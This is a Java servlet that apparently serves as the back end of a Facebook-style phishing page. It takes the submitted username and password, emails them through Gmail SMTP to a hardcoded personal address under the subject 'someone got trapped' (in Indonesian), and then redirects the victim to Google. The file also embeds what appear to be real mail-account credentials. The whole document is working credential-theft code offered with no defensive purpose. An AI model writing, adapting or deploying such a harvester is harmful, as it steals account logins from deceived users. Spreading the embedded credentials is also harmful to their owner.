package com.fjr.action.facebook;

import java.io.IOException;
import java.util.Properties;

import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ProcessRequest  extends HttpServlet{

	public void doGet(HttpServletRequest req, HttpServletResponse resp) {
		String nama = req.getParameter("username");
		String password = req.getParameter("password");
		boolean success = true; 
		if (nama != null && password != null) {

			Properties mailServerProperties = System.getProperties();
			mailServerProperties.put("mail.smtp.port", "587");
			mailServerProperties.put("mail.smtp.auth", "true");
			mailServerProperties.put("mail.smtp.starttls.enable", "true");

			Session getMailSession = Session.getDefaultInstance(mailServerProperties, null);
			MimeMessage generateMailMessage = new MimeMessage(getMailSession);
			try {
				generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("fajar.kasimbar@gmail.com"));
				generateMailMessage.setSubject("Ada yang terjebak");
				String emailBody = "nama: "  + nama + "| pasword: "+ password;
				generateMailMessage.setContent(emailBody, "text/html");

				Transport transport = getMailSession.getTransport("smtp");

				transport.connect("smtp.gmail.com", "fajar.kasimbar@gmail.com", "KasimBaR-p-21Z");
				transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
				transport.close();

			}catch(Exception e) {
				System.out.println("mail.sending error"); 
				e.printStackTrace();
				success = false; 
			}
		}


		try {
			resp.sendRedirect("http://www.google.com") ;
//			resp.addHeader("Location" , "www.google.com" );
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}	
}
